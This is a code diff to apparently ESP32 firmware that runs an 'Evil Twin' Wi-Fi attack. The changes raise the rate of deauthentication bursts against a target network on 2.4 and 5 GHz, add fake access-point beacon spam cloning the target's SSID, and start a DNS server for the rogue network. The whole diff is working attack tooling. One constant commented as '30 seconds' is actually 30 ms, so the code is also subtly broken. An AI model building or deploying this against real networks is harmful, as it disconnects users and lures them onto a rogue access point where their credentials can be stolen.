@@ -14,10 +14,12 @@
 #define CHANNEL_SWITCH_DELAY 15   // Channel switch assestment time
 #define ATTACK_WINDOW        75  // RCO duration
 #define SOFTAP_REST_TIME     300   // Home channel time
+#define SCAN_INTERVAL_US     30000 // 30 seconds
 
 /* Store target information */
 static const char *TAG = "EVIL_TWIN";
 static TaskHandle_t evil_twin_task_handle = NULL;
+static volatile bool evil_twin_running = false;
 
 /* Evil Twin Attack Status Strings */
 static const char* evil_twin_attack_status_string[EVIL_TWIN_ATTACK_STATUS_MAX] = {
@@ -96,44 +98,59 @@ static void evil_twin_task(void *pvParameters)
 
     /* Periodic scan for target tracking */
     int64_t last_scan_time = esp_timer_get_time();
-    const int64_t SCAN_INTERVAL_US = 30000000; // 30 seconds
-    
     esp_err_t frame_send_err = ESP_OK;
 
-    while(true)
+    while(evil_twin_running)
     {
-        for(uint8_t burst = 0; burst < 4; burst++) {
+        for(uint8_t burst = 0; burst < 10; burst++) {
             frame_send_err = wifi_attack_deauth_client_negative_tx_power(target->bssid, target->channel, (char *)&target->ssid);
             if(frame_send_err == ESP_OK) {
                 evil_twin_status.packet_sent_2ghz++;
-                vTaskDelay(pdMS_TO_TICKS(5));
+                vTaskDelay(pdMS_TO_TICKS(2));
             }
         }
-        for(uint8_t burst = 0; burst < 4; burst++) {
+        for(uint8_t burst = 0; burst < 5; burst++) {
             frame_send_err = wifi_attack_deauth_basic(NULL, target->bssid, 7);
             if(frame_send_err == ESP_OK) {
                 evil_twin_status.packet_sent_2ghz++;
-                vTaskDelay(pdMS_TO_TICKS(5));
+                vTaskDelay(pdMS_TO_TICKS(2));
             }
         }
+        /* Spam some FakeAP beacon */
+        for(uint8_t burst = 0; burst < 2; burst++) {
+            frame_send_err = wifi_attack_softap_beacon_spam((const char *)target->ssid, target->channel);
+            if(frame_send_err == ESP_OK) {
+                evil_twin_status.packet_sent_2ghz++;
+                vTaskDelay(pdMS_TO_TICKS(2));
+            }
+        }
+
 
         /* Deauth 5Ghz twin */
         if(evil_twin_status.has_5ghz_target == true ) {
             if(wifi_set_temporary_channel(twin_on_5ghz.channel, ATTACK_WINDOW) == ESP_OK) {
                 vTaskDelay(pdMS_TO_TICKS(CHANNEL_SWITCH_DELAY));
                 /* Send Burst */
-                for(uint8_t burst = 0; burst < 4; burst++) {
+                for(uint8_t burst = 0; burst < 10; burst++) {
                     frame_send_err = wifi_attack_deauth_client_negative_tx_power(twin_on_5ghz.bssid, twin_on_5ghz.channel, (char *)twin_on_5ghz.ssid);
                     if(frame_send_err == ESP_OK) {
                         evil_twin_status.packet_sent_5ghz++;
-                        vTaskDelay(pdMS_TO_TICKS(5));
+                        vTaskDelay(pdMS_TO_TICKS(2));
                     }
                 }
-                for(uint8_t burst = 0; burst < 4; burst++) {
+                for(uint8_t burst = 0; burst < 5; burst++) {
                     frame_send_err = wifi_attack_deauth_basic(NULL, twin_on_5ghz.bssid, 7);
                     if(frame_send_err == ESP_OK) {
                         evil_twin_status.packet_sent_5ghz++;
-                        vTaskDelay(pdMS_TO_TICKS(5));
+                        vTaskDelay(pdMS_TO_TICKS(2));
+                    }
+                }
+                /* Spam some FakeAP beacon */
+                for(uint8_t burst = 0; burst < 2; burst++) {
+                    frame_send_err = wifi_attack_softap_beacon_spam((const char *)target->ssid, target->channel);
+                    if(frame_send_err == ESP_OK) {
+                        evil_twin_status.packet_sent_5ghz++;
+                        vTaskDelay(pdMS_TO_TICKS(2));
                     }
                 }
             }
@@ -180,6 +197,7 @@ static void evil_twin_task(void *pvParameters)
         }
         vTaskDelay(pdMS_TO_TICKS(SOFTAP_REST_TIME)); 
     }
+    vTaskDelete(NULL);
 }
 
 
@@ -192,12 +210,13 @@ void evil_twin_start_attack(const target_info_t *targe_info)
     }
 
     /* Reset status information */
-    memset(&evil_twin_status, 0, sizeof(evil_twin_attack_status_t));
+    memset(&evil_twin_status, 0, sizeof(evil_twin_attack_status_info_t));
 
     /* Start DNS Server */
     dns_server_start();
-    
+    /* Start EvilTwin Task */
     target_set(targe_info, TARGET_INFO_EVIL_TWIN);
+    evil_twin_running = true;
     xTaskCreate(evil_twin_task, "evil_twin_task", 4096, NULL, EVIL_TWIN_TASK_PRIO, &evil_twin_task_handle);
 
     evil_twin_status.current_status = EVIL_TWIN_ATTACK_STATUS_ACTIVE;
@@ -214,11 +233,13 @@ void evil_twin_stop_attack(void)
         return;
     }
 
+    /* Signal task to stop and wait */
+    evil_twin_running = false;
+    vTaskDelay(pdMS_TO_TICKS(2000));
+    evil_twin_task_handle = NULL;
+
     /* Stop DNS Server */
     dns_server_stop();
-    /* Kill task */
-    vTaskDelete(evil_twin_task_handle);
-    evil_twin_task_handle = NULL;
     /* Stop sniffer */
     wifi_stop_sniffing();
     /* Wait engine stop */
